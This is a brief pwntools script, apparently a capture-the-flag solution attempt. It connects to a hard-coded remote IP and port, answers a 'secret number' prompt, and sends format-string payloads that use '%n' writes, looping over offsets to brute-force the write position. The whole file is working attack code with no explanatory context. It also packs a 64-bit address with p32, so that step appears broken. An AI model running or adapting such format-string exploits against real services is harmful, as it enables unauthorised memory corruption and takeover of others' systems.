from pwn import p32, remote, fmtstr_payload
import time

for i in range(1,10):
    r = remote("14.225.255.180", 1921)
    r.recvuntil(b"~~~Give me secret number: ")
    r.sendline(b"171")
    print(r.recvline())
    payload = p32(0x555555558016)
    payload += b'|'*(160+i)
    payload += f'%{i}$n'.encode('utf-8')
    print(payload)
    r.recvuntil(b"(yes/no)")
    r.sendline(payload)
    print(f"res: %s" %r.recvall())
    r.close()

# payload = b'|'*171+b'%7$n'
# print(payload.decode('utf-8'))
